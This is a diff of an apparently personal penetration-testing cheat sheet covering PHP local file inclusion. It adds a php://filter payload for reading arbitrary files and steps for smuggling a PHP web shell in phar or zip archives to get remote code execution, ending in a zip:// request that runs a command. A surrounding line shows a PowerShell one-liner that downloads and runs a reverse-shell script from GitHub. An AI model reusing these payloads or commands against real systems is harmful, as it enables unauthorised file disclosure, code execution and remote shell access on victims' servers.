@@ -153,11 +153,17 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 - Look for interesting info e.g. $_DOCUMENT_ROOT (can inject files to the dir)
 - Look for disabled command (search disabled) --> ** dfunc_bypasser may helps **
 - Look for extensions all sub item version below (e.g. SFX .4 that exploit)
-## using phar to smuggle php for LFI
+## Arbitary Read by LFI & php://filter Wrapper
+- ``` http://192.168.69.69/{file/view/others...}=php://filter/convert.base64-encode/resource={index/home/others??}  ```
+## using phar to smuggle php for LFI -> RCE
 - https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 1. write shell in shell.phar
 2. ``` zip shell.phar {any type that bypass checking}```
 3. running call in LFI e.g. ``` phar://directory/shell.phar/shell ```
+## using zip to smuggle php for LFI -> RCE
+- https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------
+1. ``` upload zip with cmd.php ``` to victim
+2. run ``` index.php?file=zip://uploads/upload.zip%23cmd&cmd=id ```
 
 # Windows
 1. Run As Admin
